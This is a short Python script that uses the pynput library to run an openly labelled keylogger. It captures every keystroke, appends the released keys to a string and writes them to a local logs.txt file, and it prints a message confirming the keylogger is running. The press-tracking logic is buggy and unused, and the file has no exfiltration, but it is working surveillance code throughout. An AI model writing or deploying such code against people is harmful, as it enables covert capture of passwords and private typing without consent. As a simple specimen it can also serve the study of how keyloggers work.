from pynput import keyboard
import json

key_list = []
x= False
key_strokes=""


def update_txt_file(key):
    with open('logs.txt','w+') as key_strokes:
        key_strokes.write(key)


def on_press(key):
    global x, key_list
    if x==False:
        key_list.append(
            {'Pressed': f'{key}'}
        )
        x=True
    if x==True:
        key_list.append(
            {'Held': f'{key}'}
        )

def on_release(key):
    global x, key_list,key_strokes 

    key_strokes=key_strokes + str(key)
    update_txt_file(str(key_strokes))



print(" Running keylogger successfully!")
with keyboard.Listener(
    on_press=on_press,
    on_release=on_release)as listener:
    listener.join()

